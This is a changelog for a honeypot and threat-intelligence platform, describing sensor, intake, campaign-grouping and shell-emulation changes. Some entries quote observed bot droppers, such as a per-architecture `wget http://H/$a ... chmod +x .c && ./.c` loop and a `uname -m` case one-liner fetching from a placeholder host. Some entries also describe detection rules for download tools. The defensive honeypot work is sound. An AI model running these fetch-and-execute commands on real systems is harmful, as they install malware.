# Changelog

## Unreleased

### Added

- **ATT&CK techniques on the address and campaign pages** - the per-address page gets an "ATT&CK
  techniques" panel (each rule that tagged a technique and the token it matched) and technique
  chips in each session card's header; the campaign list shows chips under each campaign and a
  campaign's page the same panel. Built from the existing `.sev` chip and panel components, with
  attacker tokens escaped. No migration; the tags were already written by the campaign indexer.
- **The evidence timeline shows what the shell answered** - the sensor now records a command's
  reply (what the line printed, sanitized per line, at most 4 KiB, with its length and a
  truncation flag) on the command event. Intake folds `output_sha256`, `output_len` and
  `output_truncated` into the event's metadata, so the hash chain covers them, and stores the text
  once per digest in the new `shell_output` table (migration `0018`, additive; the ledger never
  holds the text). It refuses a line whose digest is not the text's. The timeline folds the reply
  under its command in the existing raw expander, escaped. Commands recorded before this, and
  lines left waiting for input, show none. On a synthetic mix of 1000 bot sessions the table held
  one row per 3.9 replies (5.1 times fewer bytes than the replies themselves).
- **A multi-line command is kept as its lines** - SSH exec and the interactive shells recorded a
  script such as `cd /tmp` / `wget ...` / `sh x` as one line, because the sanitizer folds every
  line break into a space. A command that had a break now also carries `metadata.command_lines`
  (each line sanitized, blank lines kept, at most 64 lines and 1024 bytes together, with
  `command_lines_truncated` when anything was left out). `command` is unchanged, so the campaign
  indexer, the ATT&CK rules and the fingerprints are unaffected. The evidence timeline renders the
  lines as a numbered list in place of the fused text; events recorded before the key existed, and
  single-line commands, show what they showed. No migration: it is an additive metadata key on new
  events only.
- **The evidence timeline shows what the fetcher did with each download** - a
  `honeypot_file_download` event now carries a line under its URL: `fetched` with the sample
  hash linked to its page, `refused` (the SSRF guard or hop limit) or `failed` with the recorded
  reason, `gave up after N attempts`, `pending`, or `not fetched` for a scheme outside the
  fetcher. The outcome is the URL's current `fetch_attempt` record, matched by the fetcher's own
  `url_hash`, so a later reporter's download shows the capture the first reporter's produced.
  Reasons are length-capped and escaped. A failed lookup names "download outcomes" in the
  page's degraded banner. The "URLs this IP tried to fetch" panel shares the classifier and
  shows a guard rejection as refused.
- **ATT&CK technique tags on sessions, sources and campaigns** - deterministic rules over exact
  evidence, no model: a shell line is parsed into commands and a rule reads a command's name,
  operands and redirection targets, so `echo crontab` and a URL containing `cron` are not tagged.
  Eighteen rules cover brute force (the `ssh_brute_force` signal), ingress tool transfer (downloads,
  `wget`/`curl`/`tftp`/`ftpget`, uploads), Unix shell, cron, systemd units, rc scripts, authorized
  keys, system, file and process discovery, permission changes, file deletion, miner indicators
  and impaired defenses. Each tag keeps its rule, the event and the matched token. Checked against
  ATT&CK Enterprise v19.2, which moved Impair Defenses: security-tool kills are T1685 and firewall
  flushes T1686. T1078 and T1110.001 are not tagged (the honeypot accepts every credential and
  stores no password). Migration `0017` adds `attack_tag`, `campaign_attack_tag` and
  `campaign_session.attack_pending`; a command-sequence campaign carries the union of its runs'
  tags. Read through `review::attack::{campaign_tags, source_tags, session_tags}`; the console
  does not show them yet. No backfill: events indexed before the migration are tagged by the full
  rebuild. Not published to the feed or to vendors.
  See [ATT&CK tagging](docs/reference/attack-tagging.md).
- **Miner and test-key indicators from captured artifacts** - found in a mobile dropper
  analysed 2026-10-08. A script URL on `coinhive.com`, `coin-hive.com` or `authedmine.com`
  (under `/lib/`) is a URL indicator labeled `CoinHive miner script`; a `CoinHive.Anonymous(` or
  `CoinHive.User(` call is an embedded-credentials flag `CoinHive site key`, never the key
  itself; and a zip carrying the public AOSP test key certificate (SHA-256 `A4:0D:A8:0A...:F5:DC`)
  is an RSA-key indicator naming it. The certificate is seen when it is stored uncompressed, as
  in the APK Signing Block of v2 and later, and inside a deflated `META-INF/*.RSA` entry of a
  v1-signed APK, which is inflated in memory up to 256 KiB (a signature block is a few KiB).
  No schema change: the three reuse existing indicator kinds.
- **CI lints the shell scripts** - a `shellcheck` job (the v0.11.0 image, pinned by digest) runs
  over `deploy/*.sh` and `scripts/**/*.sh`. Its nine findings in `deploy/config-check.sh` and
  `deploy/logrotate-guard.sh` are fixed or annotated in place with the reason.
- **Telnet closes the door on a source whose infection finished** - Mirai-family loaders repeat
  the identical infection every 60-90 s for as long as the target answers (one source: 14
  identical sessions, 252 events in 22 minutes), because a real device's bot replaces telnetd and
  the port closes. When a telnet session ends having run a file it fetched (`wget`, `curl`,
  `tftp`, `ftpget`) or assembled from typed bytes natively, the sensor resets new connections
  from that source (an IPv4 address or an IPv6 /64) for `PROPOLIS_TELNET_INFECTED_HOLD_SECS`
  (default 21600; `0` turns it off; malformed or above 604800 refuses to start). A build for
  another CPU (Exec format error), a download never run and an assembled downloader that cannot
  reach its server do not count, so a per-architecture loop is held only once its native build
  runs. The first session is recorded as before; refusals are counted per source and summarized
  in one journal line a minute. The table holds 4096 sources and a restart clears it. The
  handshake still completes before the reset (a closed port answers the SYN with an RST).
  `FakeShell::infection_completed` exposes the signal to any sensor.
- **A log line the database always refuses is quarantined and intake moves on** - such a line
  (a NUL in a captured command, which `jsonb` cannot hold, for one) used to hold its sensor's
  intake at that line until an operator edited the log. After the same line is refused on three
  polls in a row, for a reason that is the line's own (never a lost connection), intake appends it
  to `/var/lib/propolis/quarantine/<sensor-label>.jsonl` (`PROPOLIS_QUARANTINE_DIR`; sensor, log
  path, byte offset, SHA-256, SQLSTATE, a capped error, and the line itself, base64 when it is not
  UTF-8), fsyncs the record, and only then moves past exactly that line and saves the cursor. If
  the record cannot be written, or the directory is at its cap (64 MiB, 10,000 records), intake
  stays on the line and the `intake-stalled` text says why. New ops alert `intake-line-quarantined`
  (the monitor now has sixteen conditions), a `propolis_intake_lines_quarantined_total` counter on
  `/metrics`, and a WARN log line in both the daemon and the standalone `intake`.
  `deploy/provision.sh` creates the directory; `deploy/intake.service` gains it as an optional
  `ReadWritePaths` entry. The directory is never cleaned automatically.

### Changed

- **The fleet page's Ledger panel no longer scans the event table on every refresh** - it ran
  `count(*)` and `max(ingested_at)` (no index, so a full read) over the whole ledger each 30 s.
  The count is exact up to 100,000 events and shown bare; past that it is the planner's row
  estimate, shown as `about N` and labelled `(estimate)`. The newest ingest is read off the
  newest row by `id`. The Attackers total shares the rule (`routes::rowcount`) and skips its
  bounded scan once statistics put the table past the cap. The integrity page still counts on load.
- **The evidence timeline's header says what it counts** - it read "54 events", which looked like
  the address's total or its commands. It now reads, for example, `newest 200 events: 199
  commands, 1 session, 1 outside any session`: ledger rows on the page, of which command
  events, the distinct sessions, and rows that predate session tracking. "newest" appears only
  when older events wait behind Load more.
- **Campaigns and Samples say what the bots are doing and what they dropped** - the Campaigns list
  was a wall of "same sample" and "same commands" rows, one per host and per command count, and
  Samples repeated it. The list now sorts by hosts (then last seen; links for last and first
  seen), hides single-host groups behind a "show single-host groups (N)" toggle, no longer lists
  the same-sample kind (its page, approval and the queue's group links still work), and gives
  each row the opening commands, the command range as secondary text, a rule badge, a host count
  coloured like queue scores, the hosts-per-day sparkline, an Active cell in the queue's format,
  top sensors and one "delivers" sample link with a count. Tabs are behaviour, multi-service
  scans, HTTP on shell port and login only. Samples rows gain host count, sparkline, Active and
  "delivered by campaign N", sorted by hosts. Both lists are cards at 390 px with no sideways
  scroll. Grouping, indexer, approval and what is submitted are unchanged. The IP page's malware
  panel no longer says "no samples" beside a captured sample first reported by another address.
- **The operator allowlist now covers vendor reporting, not only the published feed** - an address
  in `PROPOLIS_FEED_ALLOWLIST`, `PROPOLIS_FEED_ALLOWLIST_FILE` or an ASN in
  `PROPOLIS_FEED_ASN_ALLOWLIST` was kept out of the feed but still reached the review queue and
  could be submitted to AbuseIPDB, DShield and OTX on approval, so a declared crawler could be
  reported as an attacker. The review queue no longer surfaces a listed address, withdraws one that
  is already Pending (logged with the reason `allowlisted`; the row is deleted, so removing the
  address from the list surfaces it again), and the submission runner refuses a listed address
  before any vendor call even if it was approved before the list covered it. Scoring is unchanged
  and the console still shows the activity. The list is read once at startup, so an edit needs a
  restart (a standalone `review` unit needs the variables in its own env file). The parser and the
  matcher moved from `feed` to `core-scoring::allowlist` so the feed and the review stage share one
  implementation; malformed-file refusal and the width and size caps are unchanged. The console's
  queue and IP pages do not yet say "allowlisted".
- **The review queue reads at a glance** - fifty-six pending rows had become a wall: a notes
  textarea and three buttons on every row, "honeypot" in every Categories cell, a score bar that
  hardly varied, and five hosts of one campaign as five full rows. Pending entries now group by
  campaign: two or more listed members make one expandable row (campaign label, counts, what the
  group did, the top score and a single "Approve all N", which still goes through the two-step
  campaign confirmation), and addresses alone in their campaign or in none stay rows. An address
  in several campaigns is listed under the one with the most pending members, then the most
  hosts, then the lowest id. The notes field is a "note" toggle inside the row, so decisions post
  exactly as before. The Categories column is gone from every tab (the data stays on the IP
  page), the score is a number coloured by feed tier, First seen and Last seen became one Active
  cell (`10:58-18:11 UTC`, or `2d, last 3 min ago`, exact times on hover) with sort links above
  the table, and each context line leads with what the address did, dims sensor and session
  counts, and moves "counts from N of M events" to a tooltip. At 390 px entries stack as cards
  with no sideways scroll.

### Fixed

- **Most active on the dashboard no longer runs off a phone screen** - at 390 px the table's last
  two columns (what it did, last seen) were clipped. Below 640 px each row is now a card, the
  same pattern the queue, campaigns and samples lists use: address and events on top, the 24-hour
  strip and last seen under, the tags last.
- **Samples no longer says "not fetched" for every uploaded file** - the Transport column describes
  how the fetcher's connection was authenticated, which means nothing for a body a sensor took
  from the address that sent it. Those rows now read `n/a, uploaded`; a body in the fetcher's
  bucket with no successful fetch record reads `not recorded`; fetched files show their
  transport as before.
- **The soak harness counts rejected lines from the ledger** - the intake child's rejected
  counter reached the harness only through a status file written once a second, so a SIGKILL
  lost the last increments (one kill run printed "rejected 112 of 113 malformed" with nothing
  lost; a 2026-10-09 kill run showed 171 against 180). The report now derives the rejected
  malformed lines from the ledger and shows the child's counter beside it, short only after a
  restart. Harness only.
- **A flaky "Text file busy" in the deploy tests** - `deploy_test` wrote fixture scripts and ran
  them while another test thread's fork could still hold the write descriptor, so
  `upgrade_guard_skips_the_pull_and_requires_the_carried_timestamp` and
  `upgrade_reexecs_once_when_the_pull_changes_the_script_and_does_not_pull_again` failed in 7 of
  200 parallel runs. Writing an executable and spawning a child now share one lock, held across
  the spawn and never the wait; 0 of 200 afterwards. Test-only.
- **An upload in flight at SIGTERM is recorded, not dropped** - the capture shutdown drain only
  wrote jobs already queued; a capture still being assembled on a live connection was lost when
  the runtime dropped the connection after the queue had closed. Each capturing sensor (ssh,
  telnet, adb, ftp, mqtt, tftp) now registers its connections in the hand-off's tracker
  (`run_tcp_listener_tracked`, `run_tls_listener_tracked`, tftp's request loop), and
  `CaptureHandoff::drain` first gives them up to 3 s to finish, cancels the rest (their capture
  guard submits the fragment, stored with `complete` false and `end_reason` `session_cancelled`),
  waits for them to end, and only then drains the queue, all inside the one 10 s deadline
  (grace and cancel wait are at most a quarter of it each). `drain` now returns a `DrainReport`
  with a per-phase outcome. A task wedged in blocking code still cannot be cut; the drain logs a
  WARN and stays inside the deadline.
- **Docs listed the wrong body-spooling sensors** - the sample lifecycle page named three (SSH,
  FTP, ADB), the capacity and environment pages five; the code has six (ssh, ftp, adb, telnet,
  tftp, mqtt). MQTT's spool row is added, and DNS is listed among the sensors that spool nothing.
- **The fetcher never dials a public DNS resolver** - observed 2026-10-08: a telnet bot tested
  wget, curl, tftp and ftpget against `http://1.1.1.1/wget.sh` and its siblings, and the fetcher
  followed the URLs to Cloudflare. The never-dial check now also refuses the published addresses
  of Cloudflare, Google Public DNS, Quad9 and OpenDNS, IPv4 and IPv6 (sixteen in all), including
  their IPv4-mapped, NAT64 and 6to4 forms and any hostname that resolves to one. The attempt is
  recorded as `rejected` with the reason `Forbidden(PublicResolver)`, which the IP page already
  shows beside the status. All sixteen addresses were checked on 2026-10-09 against the
  operators' own pages, and each table entry now carries its source URL (the OpenDNS IPv6 pair
  against Cisco's Umbrella IPv6 article); none was wrong. The operators also publish filtered
  variants (Cloudflare `1.1.1.2`/`1.1.1.3`, Quad9 `9.9.9.10`/`9.9.9.11`), which are not blocked.
- **A `copytruncate` rotation no longer discards what intake had not yet read** - found by the
  intake soak: with intake behind when the log rotated, the tailer restarted at offset 0 of the
  emptied file and every unread line of the old content, which by then existed only in
  `events.jsonl.1`, was never read (71,150, 442,378 and 822,979 telnet lines in three soak runs,
  with no error; a reader that was caught up lost only the 48 to 570 lines written between the
  copy and the truncate). On a truncation, or an in-place replacement, the tailer now opens
  `<log>.1`, checks that it is the old content (its first 256 bytes hash to the stored
  fingerprint and it reaches the read offset), drains it from the offset through the same machinery
  as a rename rotation, then continues the new file. The saved cursor stays inside the old content
  until that drain ends, so a restart resumes it. The shipper and `propolis-watch` share the fix.
  Only `.1` is read, which the shipped `delaycompress` policy leaves uncompressed until the next
  rotation. When `.1` is missing, compressed or another generation's, it is not read and the loss
  is logged as a WARN and counted; the new `intake-rotation-loss` ops-alert condition (the
  fifteenth) pages on it and holds for an hour. `deploy/logrotate-guard.sh` also skips a log whose
  `.1` the reader has not finished (the next rotation would compress it unread) or whose live file
  has more than 64 MiB unread (`PROPOLIS_LOGROTATE_MAX_UNREAD_BYTES`), reading the reader's
  cursor read-only from the intake and shipper cursor directories (named by the resolved log
  path on both sides, so a symlinked spelling finds the same cursor; a cursor still in `.2`
  also skips); with no readable cursor it rotates and says why, at warning priority in the
  journal, and `deploy/config-check.sh` flags a log with no cursor and a cursor directory the
  rotation unit cannot see. Restart safety: a second rotation while the first copy drains no
  longer loses either generation on a restart (each queued generation keeps a resume point;
  `.1`, `.2` and, under the shipped compress + delaycompress policy, `.2.gz` are searched by
  fingerprint, the gzip expanded into an unlinked scratch file in the cursor directory, capped
  at 512 MiB and only when that plus the guard's 512 MiB reserve is free, otherwise a reported
  loss "insufficient disk to expand"; a generation that cannot be found is a reported loss and
  NO rotated copy is read in its place, so the documented manual `truncate` while the reader is
  stopped does not re-ingest the previous generation);
  a restart mid-drain with a live file under 256 bytes is no longer read as small-file growth;
  and a copytruncate during a failed batch no longer re-appends the committed prefix. The
  rotation guard also skips a cursor still inside `.2.gz`. Cursor files are now named by the
  resolved log path; a cursor named by the path as configured is moved to the resolved name on
  first load and the old file removed (a one-time migration, to be deleted once every
  deployment has restarted on this version), so an upgrade does not re-read such a log from 0.
  The cursor gains one optional field, written only when set and ignored by older readers:
  `fingerprint_len` (so a cursor taken while the log was under 256 bytes still matches the grown,
  rotated copy, in the tailer and the guard; the window is widened as the file grows, so a stamp
  taken on the start of a first line does not stay that short). When both a
  resolved-name and an as-configured cursor file exist the newer one wins. `log-tailer` gains
  `flate2` and `libc` dependencies (both already in the lockfile, vendored). A skipped log makes `propolis-logrotate.service` show failed until a later
  run rotates it. `logrotate --force` no longer discards a backlog: archive and truncate by hand
  ([intake backlog](docs/troubleshooting/intake-backlog.md#recovering-a-backlog-too-large-to-drain)).
  The "small window" wording in `deploy/logrotate-sensors.conf` and the docs now says what the
  window is: the copy-to-truncate gap, not a reader that is behind.
- **VirusTotal upload sends only executable or script content** - with `PROPOLIS_VT_UPLOAD=true`
  the scanner uploaded any captured file VirusTotal did not know, so an image or video an
  attacker pushed (potentially illegal material) would have been sent to a third party within
  one scan cycle. The upload now needs the body's CONTENT to be an ELF, PE, Mach-O, Java class,
  DEX, a script (shell, Python, Perl, PHP, PowerShell or batch, by shebang or at least two strong
  signatures), or a zip, tar or gzip archive in which a bounded look (64 entries, 1 MiB
  decompressed, two levels deep) finds such a member; names and extensions are never consulted.
  Images, video, audio, PDF, office documents, 7z, rar, bzip2, xz, zstd and anything unrecognised
  stay local, and any detection error, limit or panic refuses. A refused body is still looked up by
  hash (the request carries only the digest), is logged at INFO with its SHA-256 and detected type,
  and gets a `sample_analysis` row `detected = -2, total = -2` so it is not looked up again. The
  console shows such a sample as "not uploaded (type)" on the samples and IP pages, only `-1`
  counts as pending in the metrics and the pending-oldest-age gauge, and
  `propolis_sample_analysis{state="not_uploaded"}` counts the `-2` rows. The malware custody page no longer implies nothing
  leaves without approval: it now describes the opt-in, type-filtered upload and the hash lookups.
- **The phone's toybox applets print their help before an option refusal** - read from the
  source of Android 6.0.1's toybox (not captured from a device): `get_optflags` raises
  `toys.exithelp` before it parses, `error_exit` then calls `show_help`, and the build has
  `CFG_TOYBOX_HELP 1`, so `tr` with no operand writes `usage: tr [-cds] SET1 [SET2]` and its
  description to standard error before `tr: Needs 1 argument`. Done for `tr`, `wc`, `base64`,
  `md5sum`, `sha1sum`, `cut`, `od`, `which`, `getprop` and `setprop`, with the strings of
  `generated/help.h`. Errors raised after parsing print no help.

- **A dash script's errors name the script, as dash words them** - every error of a script run
  with `sh FILE` read `sh: 3: ./x: not found`, where Ubuntu 22.04's dash prints the script as it
  was typed: `.s: 3: ./x: not found`, `./x.sh: 1: ...`, `sub/x.sh: 1: ...`, `/tmp/x.sh: 2: Syntax
  error: ...`. `sh -c CMD NAME` names `NAME`, and `-c` without one, a script on standard input and
  an interactive `sh` stay `sh: 1:`. A script that starts another keeps each its own name. This is
  the prefix of the not-found, `Exec format error`, syntax and arithmetic errors alike, and the
  per-architecture dropper fixture now expects `.s: 3: ./.c: Exec format error`. Checked line by
  line against dash in an `ubuntu:22.04` container.

- **The phone's `tr -C` complements, as `-c` does** - the toybox port treated `-C` as accepted
  and ignored, but toybox 6.0.1's option string is `^>2<1Ccsd[+cC]`: the `[+cC]` group makes each
  of the two set the other's flag, and the applet reads only the `c` flag, so `tr -Cd 'a-c'` keeps
  `a`, `b` and `c` (`crates/sensor-framework/src/shell/tr.rs`).

- **The phone's `getprop`, `setprop` and `ifconfig` are toybox's, not toolbox's** - the persona
  announces Android 6.0.1, whose `external/toybox/Android.mk` (tag `android-6.0.1_r81`) links all
  three into `/system/bin` and whose `system/core/toolbox` has no source for any of them, but the
  shell listed them as toolbox applets and answered in toolbox's words. `toybox getprop` now runs
  and `toolbox getprop` is `toolbox: no such tool getprop`. `setprop` counts operands as toybox
  does (`setprop: Need 2 arguments`, `Max 2 arguments`) and makes its checks in its words: a name
  of 32 bytes or more, a value of 92 or more (a `ro.` value too, which the old code let through),
  a leading or trailing dot, `..`, and a character outside letters, digits and `_.-`. `ifconfig`
  prints toybox's `Link encap:` listing (HWaddr, `inet addr:` with `Bcast:` and `Mask:`, the
  `inet6 addr:` line, flags and MTU, the packet and byte counters) instead of toolbox's one line
  per interface, fails an unknown interface as `ifconfig: eth9: No such device`, and refuses an
  action it does not know with the applet's help text first. `df`, `du`, `ls`, `mount` and
  `uptime` are toolbox's at that tag too and are still listed as toybox's (noted in the module
  doc of `crates/sensor-framework/src/shell/multicall.rs`).

- **The Ubuntu persona's `tr` exists, as GNU coreutils 8.32** - it answered `tr: command not
  found`, which no Ubuntu server does, so a loader that strips line breaks with `tr -d '\n'` before
  decoding stopped there. It now translates, deletes, squeezes and complements standard input with
  GNU's rules: `-c -C -d -s -t`, the long options and their abbreviations, `\NNN` and the C
  escapes, ranges, the twelve classes, `[=c=]`, `[c*n]` repeats and `[:lower:]`/`[:upper:]` case
  conversion; `--help` and `--version` print 8.32's text; and every refusal is GNU's (`tr: missing
  operand`, `tr: extra operand ‘c’`, `Try 'tr --help' for more information.`, the set errors and
  the octal and trailing-backslash warnings), with the typographic quotes the persona's
  `LANG=C.UTF-8` gives. Checked line by line against `/usr/bin/tr` of an `ubuntu:22.04` container,
  including 16,000 generated option and set combinations, none differing. The phone's toybox `tr`
  is unchanged; where the two differ (`\x41`, `\e`, repeats, `-t`, the classes' order) is listed in
  the module doc of `crates/sensor-framework/src/shell/tr_gnu.rs`.
- **Command-sequence campaigns are one per tool, not one per session length** - observed on the
  live console 2026-10-08: 947 campaigns, most of them fragments of a few bots. The fingerprint
  keyed on the whole normalized session, so one Mirai-family loader was about 40 campaigns
  ("1 commands: ...", "2 commands: ...", up to 16) because sessions stop at different points, a
  `start ; enable ; config terminal` login was ten, and `echo P155084A ; id ; echo $(( 155084 + 1 ))`
  or `N=49482a1671; ...` was one campaign per host because a random number differed. The key is now
  over the first 4 commands past the shell-entry lines, so a bot cut after 5 commands and one that
  runs 16 are the same campaign (a session cut before its fourth command is keyed by the commands
  it has); decimal runs of 4 or more digits, hex words of 6 or more characters and identifier
  values of `NAME=value` are placeholders, while short numbers (`x86`, `arm7`, `-p 22`) and
  `chmod` modes are kept; HTTP request lines sent to a shell port are one campaign instead of one
  per header order; a run of login lines only is one campaign. A campaign's label gives the range
  of command counts past the login lines (`3-16 commands: ...`). Commands the sensor decoded from
  a single-byte XOR (Mirai's `lghkel` for `enable`, key 9) are keyed and labeled as their decoded
  text, and the campaign page keeps the raw form. On a synthetic replica of the observed shapes, 106
  sessions went from 69 campaigns to 11. Migration 0016 marks existing databases as built by the
  old key; the indexer then rebuilds the command-sequence campaigns from the ledger on its next
  batches (about as long as the first catch-up), leaving sample and scanner campaigns and
  indicators as they are. Campaign ids of command-sequence campaigns change. See
  `docs/operations/campaigns.md`.

- **Running a program built for another CPU now fails, so per-architecture loops go on** -
  observed live 2026-10-08: a bot's `for a in mips mpsl arm4 arm5 arm6 arm7 x86_64 x86; do wget
  http://H/$a -O .c; chmod +x .c && ./.c && break; done` ended at `mips` because every fetched
  file ran with status 0, so the x86_64 build, the only one that matters on the Ubuntu persona
  (armv7 on the phone), was never asked for. A file is now judged by its ELF header when its bytes
  are one, else by the architecture token in the URL or local name it was fetched with; that
  origin follows `cp`, `mv` and `cat FILE > DEST`, so the Eclipse busybox-copy sequence is judged
  by what was cat over the copy. A foreign build answers `bash: ./x: cannot execute binary file:
  Exec format error` (dash: `sh: 1: ./x: Exec format error`, both status 126; the phone's mksh:
  `not executable: 32-bit ELF file`), so `&& break` and `||` chains behave as on a real host. The
  persona's own build, a name with no token and a file the session typed still run silently.
  `chmod` on the Ubuntu persona also names a missing operand (`chmod: cannot access 'x': No such
  file or directory`, status 1) as GNU chmod does, which the loop's `|| chmod +x $a && ./$a`
  branch depends on (`crates/sensor-framework/src/shell/arch.rs`).

- **The configuration check's `fix:` lines now run when pasted** - observed live 2026-10-08: the
  no-log finding's `grep LOG_PATH /etc/propolis/*.env` was refused (those files are root-only),
  and the no-events finding's line ran `psql "$DATABASE_URL" ...` (unset in an operator's shell)
  followed by prose, which bash parsed as an `if` and answered with a continuation prompt. A
  `fix:` is now only a command, or commands joined with `&&` or `;`, with `sudo` wherever root is
  needed and absolute paths for the repository's scripts; the ledger query is the script's
  new `--newest-event SENSOR` mode run with `sudo`, which reaches the database through `PG*`
  variables so no connection string or password is ever on a command line. Instructions that are not commands (edit a file,
  change a bind address, install a firewall rule or a key) print as `do:`, and the explanation
  moved into the finding text. `--json` keeps its shape and gains `fix_kind` (`run`, `manual`)
  and `id` on each finding. `config_check_test` raises every finding id (a new finding with no
  fixture fails) and executes each `fix` in bash against stub commands, failing on a parse error,
  stderr output, or a root-only command or env-file read without `sudo`.

- **Download events come from what a line executes, not from the text it carries** - observed live
  2026-10-08 (telnet) and on an SSH exec line: a bot wrote a dropper with `echo '... wget
  http://H/$a ...' >> .s` lines and ran `sh .s`, and the sensor reported `http://H/$a`, unexpanded,
  for the echo line and nothing for the fetch the loop ran; the SSH one-liner chose the binary with
  `A=$(uname -m); case $A in x86_64)U=x86_64;; ... esac; wget http://H/$U` and reported `/$U`. A
  fetch is now recorded when the evaluator runs it, from its expanded arguments, so loops, `sh
  FILE`, `sh -c`, command substitutions and variables report the real URL (`http://H/mips` for the
  observed script), and an `echo`/`printf` argument, here-document body or quoted assignment holding
  a fetch reports nothing. `case ... esac` is now run rather than skipped, so the probe above picks
  `/x86_64` on the Ubuntu persona and `/arm7` on the phone's `armv7l`. A URL still holding
  `$name`, `$(..)` or a backtick, or built from a variable that is not set, is recorded as a
  command with no `url`. The old lexical scan stays as a fallback for evidence the evaluator did
  not reach (a skipped branch, functions, syntax errors), now read with the shell's tokenizer, and
  one URL found both ways is one event (`crates/sensor-framework/src/shell/fetch.rs`). A line that
  only opens a construct reports its fetches when the construct completes. Busybox `tftp -g -l FILE
  HOST` saves under the basename of the remote name, as busybox 1.30 does.

- **An ADB base64 APK loader no longer loops on `wc: not found`** - observed live 2026-10-07: a bot
  pushed an APK to `/data/local/tmp` in about 57 `echo -n '<base64>' >> f.b64` commands, checked
  `wc -c < f.b64`, got `sh: wc: not found` from the Android shell, deleted everything and started
  over (48 rounds seen, 110 to 150 events per 10 minutes), so it never reached the decode or the
  install and no APK was ever captured. The Android shell now has the toybox tools a loader checks
  its work with: `wc`, `base64`, `md5sum`, `sha1sum`, `sha256sum`, `head`, `tail`, `cut`, `tr`,
  `od`, `which`, `id`, `mkdir`, `cp`, `mv`, `rm` and `sleep`, in `/system/bin` and in `toybox`'s
  list. Presence is taken from toybox's `Android.mk` at the persona's own release (6.0.1); `base64`
  and `sha256sum` are linked here although that release does not, so the loader proceeds
  (`crates/sensor-framework/src/shell/multicall.rs#TOYBOX_APPLETS` gives the reasoning). Their output
  and error lines follow that release's source: `wc` prints unpadded counts, `base64 -d` is the
  lenient decoder, and options, operand counts and refusals come from a port of its argument parser
  (`toyopt.rs`). The decoded bytes of an assembled base64 file are an assembly of their own, found
  across the separate shells of a connection (every `adb shell CMD` is one), and are captured as an
  `echo_loader` sample when `pm install` is given the file, when it is made executable or run, or
  when the session ends. `pm install` now prints what `Pm.runInstall` of Android 6.0.1 prints
  (`\tpkg: PATH`, then `Success` or `Failure [INSTALL_PARSE_FAILED_NOT_APK]`,
  `INSTALL_PARSE_FAILED_BAD_MANIFEST` or `INSTALL_FAILED_INVALID_URI`) by judging the file.
  `base64 -d` on both personas wrote every byte above 0x7f as two UTF-8 bytes; it writes the bytes.
  The connection's filesystem budget (196,608 bytes, shared by the base64 text and the decoded
  file) still limits the APK to about 84,000 bytes.

- **The configuration check no longer reports a loopback-only service as exposed** - on its
  first production run `deploy/config-check.sh` warned that the host's PostgreSQL on 5432 was
  "reachable from anywhere the network allows", and would have called it `DANGEROUS` behind an
  open firewall, while it listened only on `127.0.0.1` and `[::1]`. The verdict came from the
  sensor's configured `0.0.0.0` instead of the address the other process is bound to. Exposure
  is now judged from the holder's own sockets: any non-loopback one makes it exposed, loopback
  only does not. A loopback-only holder still fails the row, because the sensor's wildcard bind
  cannot share the port, and its fix line now says to bind the sensor to the host's network
  address instead.
- **Modeled binaries survive inspection** - every executable the Ubuntu persona serves was its
  recorded 64-byte header followed by `0x80 | (offset & 0x3f)` filler, identical for every
  binary, so `busybox cat /proc/self/exe` flooded two megabytes of U+FFFD and `readelf` found
  noise where the program headers belong. The body is now generated from the recorded header
  (`crates/sensor-framework/src/elf_body.rs`): program headers that match the sections,
  `.interp`, a per-binary build ID, libc imports with their `GLIBC_2.x` versions, relocations,
  `.dynamic`, usage strings for the program, instruction-shaped `.text` and the section header
  table at the recorded offset. `readelf -lhSdV --dyn-syms` parses all 84 images without a
  warning, `file` reports a dynamically linked PIE with the x86-64 loader (busybox, recorded as a
  static `ET_EXEC`, reports statically linked), and `strings` shows the loader, imports, versions
  and usage line. Still generated per byte in constant memory at the recorded size; no real
  binary is shipped. `/bin/ls` keeps its first newline at 409. A whole-file `busybox hexdump -e
  '16/1 "%c"'` without `-v` of a binary now prints nothing (the image has the zero runs the real
  tool squeezes to `*`, which is not modeled). The bytes of every image changed, so its digests
  did: any stored fingerprint of a served binary is stale.
- **Shell `tftp` downloads are read in every common form** - a telnet dropper's classic
  `tftp HOST -c get FILE` was recorded as `tftp://HOST:get` (the `-c get` pair taken for a port, the
  file name lost), while the BusyBox form was right. The shell now parses BusyBox
  (`-g -r REMOTE [-l LOCAL] HOST [PORT]`, any flag order, `-gr` clusters, attached values),
  tftp-hpa one-shot (`HOST [PORT] -c get REMOTE`, the server last, or `HOST:FILE`), IPv6 in
  brackets or bare, and quoted or escaped arguments, into `tftp://HOST[:PORT]/FILE`. A command line
  whose server or file cannot be read, or whose address, port or file name would not make a sound
  URL, now emits `honeypot_file_download` with the raw `command` and no `url` instead of a guessed
  one, so the fetcher is never handed a malformed target (it already skips url-less events). A
  `tftp` upload (`-p`, `put`) is not a download and emits no download event; the command event
  still records it. A host with no file no longer yields a bare `tftp://HOST`. No wire or migration
  change.
- **SSH bare connects, banner grabs and bad version strings are now recorded** - the SSH sensor
  emitted `honeypot_connection` only after key exchange, so a Shodan/Censys-style scanner that
  read the banner and left, a client that sent a malformed identification line, and a bare TCP
  probe left no event (the fleet probe reported "socket answered, no line reached intake" for
  tcp/22). The event is now emitted at accept, once per connection, like the other TCP sensors.
  A connection that ends before key exchange completes also emits one `honeypot_session_end`
  (telemetry, unscored) with `end_reason`, `phase`, `duration_ms` and the sanitized
  `client_version` when received. Consequence: such connections now carry the same
  `honeypot_connection` weight (40) as a telnet connect did already. No migration or wire change.

### Added

- **An intake soak harness** - `crates/propolis/examples/soak` drives sustained synthetic sensor
  traffic (telnet-dominated, long and over-length lines, copytruncate and rename rotation, a
  backdated multi-gigabyte backlog) through the real intake runner and the review submission loop
  against a scratch database, samples lag, memory, append-lock wait and ledger growth, accounts
  every line written against the ledger, and ends in a PASS/FAIL report with fault injection (kill,
  cursor loss, a poison line). See `docs/development/intake-soak.md`. Run by hand; not in the suite.
- **Intake appends a batch of lines in one transaction** - after the dedup index (migration `0013`)
  and the incremental breadth sets (migration `0014`) removed the costs that grew with lag and with
  a source's history, what remained was one transaction, one lock acquisition and one commit per
  line, which held the node to a few hundred events a second whatever the hardware. A new
  `core_scoring::append_events` appends a batch (scored events and telemetry, in log order) with
  one lock acquisition: it hashes the chain in order from one head read, loads each touched
  source's score, vantages, sensors and dedup lookup once, folds the events through the same
  `apply_event` in order, inserts the ledger rows with one multi-row `INSERT` and writes each
  touched source once. No migration, no change to the hash chain, the scoring formulas or the
  ledger's order. A property test (`crates/core-scoring/tests/batch_equivalence.rs`: eight
  seeds, 32 streams of 20 to 160 events over six sources, every signal type, duplicates, out-of-order
